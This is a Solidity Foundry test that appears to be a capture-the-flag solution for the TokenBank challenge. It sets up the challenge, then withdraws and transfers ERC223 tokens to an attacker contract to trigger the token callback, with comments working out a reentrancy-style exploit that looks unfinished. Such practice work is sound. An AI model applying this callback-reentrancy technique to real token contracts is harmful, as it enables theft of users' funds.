// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/TokenBank.sol";

contract TankBankTest is Test {
    TokenBankChallenge public tokenBankChallenge;
    TokenBankAttacker public tokenBankAttacker;
    address player = address(1234);

    function setUp() public {}

    function testExploit() public {
        tokenBankChallenge = new TokenBankChallenge(player);
        tokenBankAttacker = new TokenBankAttacker(address(tokenBankChallenge));

        // Put your solution here
        vm.startPrank(player);
        //balanceOf in bank doesnt follow balance of token
        //probably I can move my token balance around and deposit(call tokenFallback through transfer) to bank,
        //so I create more balances?

        //transfer tokens to attacker contract
        //we have to transfer instead of approve to trigger the fallback

        tokenBankChallenge.withdraw(tokenBankChallenge.balanceOf(player));
        SimpleERC223Token token = SimpleERC223Token(tokenBankChallenge.token());
        token.transfer(address(tokenBankAttacker), token.balanceOf(player), abi.encode("deposit"));

        //start the attack

        _checkSolved();
    }

    function _checkSolved() internal {
        assertTrue(tokenBankChallenge.isComplete(), "Challenge Incomplete");
    }
}
